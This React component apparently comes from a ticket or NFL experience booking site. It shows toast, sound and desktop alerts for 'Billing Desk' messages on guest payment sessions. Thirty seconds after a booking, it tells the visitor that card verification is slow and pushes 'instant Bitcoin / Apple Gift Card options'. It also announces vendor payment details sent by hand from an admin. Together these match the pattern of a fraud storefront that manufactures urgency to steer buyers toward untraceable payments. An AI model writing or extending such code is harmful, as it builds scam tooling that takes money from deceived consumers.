import React, { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "motion/react";
import { Mail, Bell, CheckCircle2, ArrowRight, X } from "lucide-react";
import {
  PaymentSession,
  subscribeToPaymentSession,
  getSavedGuestSessions,
  getReadGuestMailIds,
  markGuestMessagesAsRead,
  playGuestNotificationChime,
  SAVED_SESSIONS_EVENT,
  READ_MAIL_EVENT
} from "../../services/paymentControlService";

interface GuestAlertItem {
  eventId: string;
  sessionId: string;
  kind: "admin_message" | "details_ready";
  title: string;
  preview: string;
  method?: string;
  createdAt: number;
}

interface GuestMailNotifierProps {
  onOpenSession: (sessionId: string) => void;
  onUnreadCountChange?: (count: number) => void;
}

export const GuestMailNotifier: React.FC<GuestMailNotifierProps> = ({
  onOpenSession,
  onUnreadCountChange
}) => {
  const [trackedSessionIds, setTrackedSessionIds] = useState<string[]>(() =>
    getSavedGuestSessions()
      .slice(0, 5)
      .map((s) => s.id)
  );
  const [liveSessions, setLiveSessions] = useState<Record<string, PaymentSession>>({});
  const [readIds, setReadIds] = useState<string[]>(() => getReadGuestMailIds());
  const [activeToast, setActiveToast] = useState<GuestAlertItem | null>(null);
  const [nowMs, setNowMs] = useState(() => Date.now());

  const chimePlayedRef = useRef<Set<string>>(new Set());
  const initialSnapshotIdsRef = useRef<Set<string>>(new Set());

  // Sync saved guest sessions & read IDs across tabs/components
  useEffect(() => {
    const syncSaved = () => {
      const nextIds = getSavedGuestSessions()
        .slice(0, 5)
        .map((s) => s.id);
      setTrackedSessionIds((prev) => {
        if (prev.length === nextIds.length && prev.every((id, i) => id === nextIds[i])) {
          return prev;
        }
        return nextIds;
      });
    };

    const syncRead = () => {
      setReadIds(getReadGuestMailIds());
    };

    window.addEventListener(SAVED_SESSIONS_EVENT, syncSaved);
    window.addEventListener(READ_MAIL_EVENT, syncRead);
    window.addEventListener("storage", syncSaved);
    window.addEventListener("storage", syncRead);
    window.addEventListener("focus", syncSaved);

    return () => {
      window.removeEventListener(SAVED_SESSIONS_EVENT, syncSaved);
      window.removeEventListener(READ_MAIL_EVENT, syncRead);
      window.removeEventListener("storage", syncSaved);
      window.removeEventListener("storage", syncRead);
      window.removeEventListener("focus", syncSaved);
    };
  }, []);

  // Subscribe in real-time to each saved guest session on this browser
  useEffect(() => {
    if (trackedSessionIds.length === 0) return;

    const unsubs = trackedSessionIds.map((id) =>
      subscribeToPaymentSession(id, (session) => {
        if (!session) return;
        setLiveSessions((prev) => ({ ...prev, [id]: session }));
      })
    );

    return () => {
      unsubs.forEach((unsub) => unsub());
    };
  }, [trackedSessionIds.join("|")]);

  // Tick every 30s so 10-minute follow-up alerts trigger swiftly even while browsing other sections
  useEffect(() => {
    const timer = setInterval(() => setNowMs(Date.now()), 30000);
    return () => clearInterval(timer);
  }, []);

  // Compute unread notifications and fire toast/sound when new admin messages arrive
  useEffect(() => {
    const readSet = new Set(readIds);
    const alerts: GuestAlertItem[] = [];

    (Object.values(liveSessions) as PaymentSession[]).forEach((session) => {
      if (!session || session.status === "completed" || session.status === "cancelled") return;

      if (Array.isArray(session.messages)) {
        session.messages
          .filter((m) => m.sender === "admin")
          .forEach((m) => {
            if (!readSet.has(m.id)) {
              alerts.push({
                eventId: m.id,
                sessionId: session.id,
                kind: "admin_message",
                title: m.subject || "New Update from Billing Desk",
                preview: m.body,
                method: session.paymentMethod,
                createdAt: m.createdAt || session.updatedAt || Date.now()
              });
            }
          });
      }

      if (
        session.status === "awaiting_admin_details" &&
        !session.adminPaymentDetails &&
        session.createdAt &&
        nowMs - new Date(session.createdAt).getTime() >= 30 * 1000
      ) {
        const followUpId = `thirty_sec_followup:${session.id}`;
        if (!readSet.has(followUpId)) {
          const methodUpper = String(session.paymentMethod || "selected").toUpperCase();
          alerts.push({
            eventId: followUpId,
            sessionId: session.id,
            kind: "admin_message",
            title: "Quick update on your NFL experience booking",
            preview: `$0 charged yet — ${methodUpper} verification is taking a little over 30s. View instant Bitcoin / Apple Gift Card options or continue waiting.`,
            method: session.paymentMethod,
            createdAt: new Date(session.createdAt).getTime() + 30 * 1000
          });
        }
      }

      if (session.status === "details_provided" && session.adminPaymentDetails) {
        const detailsEventId = `details_ready:${session.id}:${
          session.adminPaymentDetails.updatedAt || session.paymentMethod
        }`;
        if (!readSet.has(detailsEventId)) {
          alerts.push({
            eventId: detailsEventId,
            sessionId: session.id,
            kind: "details_ready",
            title: "Verified Vendor Payment Details Ready",
            preview: `Your ${String(session.paymentMethod || "").toUpperCase()} payment details for ${session.itemTitle} are now ready to view.`,
            method: session.paymentMethod,
            createdAt: session.adminPaymentDetails.updatedAt || session.updatedAt || Date.now()
          });
        }
      }
    });

    alerts.sort((a, b) => b.createdAt - a.createdAt);
    onUnreadCountChange?.(alerts.length);

    if (alerts.length === 0) {
      setActiveToast(null);
      return;
    }

    const newest = alerts[0];
    setActiveToast(newest);

    if (!chimePlayedRef.current.has(newest.eventId)) {
      chimePlayedRef.current.add(newest.eventId);

      // Play gentle sound chime and optional desktop notification if already permitted
      const isFresh = initialSnapshotIdsRef.current.has(newest.sessionId);
      if (isFresh || newest.kind === "admin_message") {
        playGuestNotificationChime();
      }

      if (
        typeof window !== "undefined" &&
        "Notification" in window &&
        Notification.permission === "granted" &&
        document.visibilityState !== "visible"
      ) {
        try {
          new Notification(newest.title, {
            body: newest.preview,
            tag: newest.eventId
          });
        } catch {
          // Ignore browser notification failure
        }
      }
    }

    initialSnapshotIdsRef.current.add(newest.sessionId);
  }, [liveSessions, readIds, nowMs, onUnreadCountChange]);

  const handleDismiss = (eventId: string) => {
    markGuestMessagesAsRead([eventId]);
    setActiveToast(null);
  };

  const handleOpen = (item: GuestAlertItem) => {
    markGuestMessagesAsRead([item.eventId]);
    setActiveToast(null);
    onOpenSession(item.sessionId);
  };

  return (
    <AnimatePresence>
      {activeToast && (
        <motion.div
          key={activeToast.eventId}
          initial={{ opacity: 0, y: -16, scale: 0.96 }}
          animate={{ opacity: 1, y: 0, scale: 1 }}
          exit={{ opacity: 0, y: -12, scale: 0.96 }}
          className="fixed top-24 right-3 sm:right-6 z-[95] w-[calc(100vw-1.5rem)] max-w-sm bg-[#080d22]/98 backdrop-blur-xl border border-sky-400/45 rounded-2xl shadow-2xl shadow-sky-950/60 overflow-hidden"
        >
          <div className="h-1 w-full bg-gradient-to-r from-sky-400 via-blue-500 to-emerald-400" />
          <div className="p-4 space-y-3">
            <div className="flex items-start justify-between gap-2">
              <div className="flex items-center gap-2.5 min-w-0">
                <div
                  className={`w-9 h-9 rounded-xl flex items-center justify-center shrink-0 border ${
                    activeToast.kind === "details_ready"
                      ? "bg-emerald-500/20 border-emerald-400/40 text-emerald-300"
                      : "bg-sky-500/20 border-sky-400/40 text-sky-300"
                  }`}
                >
                  {activeToast.kind === "details_ready" ? (
                    <CheckCircle2 className="w-5 h-5" />
                  ) : (
                    <Mail className="w-5 h-5" />
                  )}
                </div>
                <div className="min-w-0">
                  <span className="text-[10px] font-black uppercase tracking-wider text-sky-300 flex items-center gap-1">
                    <Bell className="w-3 h-3" />
                    Direct Site Message · No Login Needed
                  </span>
                  <h4 className="text-xs font-black text-white truncate mt-0.5">
                    {activeToast.title}
                  </h4>
                </div>
              </div>

              <button
                type="button"
                onClick={() => handleDismiss(activeToast.eventId)}
                aria-label="Dismiss message notification"
                className="p-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-zinc-400 hover:text-white cursor-pointer shrink-0"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <p className="text-xs text-zinc-200 leading-relaxed line-clamp-3">
              {activeToast.preview}
            </p>

            <div className="flex items-center justify-between gap-2 pt-1">
              <span className="text-[10px] font-mono text-zinc-400 truncate">
                Ref: {activeToast.sessionId}
              </span>
              <button
                type="button"
                onClick={() => handleOpen(activeToast)}
                className="px-3.5 py-2 rounded-xl bg-gradient-to-r from-sky-500 to-blue-600 hover:from-sky-400 hover:to-blue-500 text-white font-black text-[10px] uppercase tracking-wider flex items-center gap-1.5 cursor-pointer shadow-md shrink-0"
              >
                <span>Open Awaiting Details</span>
                <ArrowRight className="w-3.5 h-3.5" />
              </button>
            </div>
          </div>
        </motion.div>
      )}
    </AnimatePresence>
  );
};
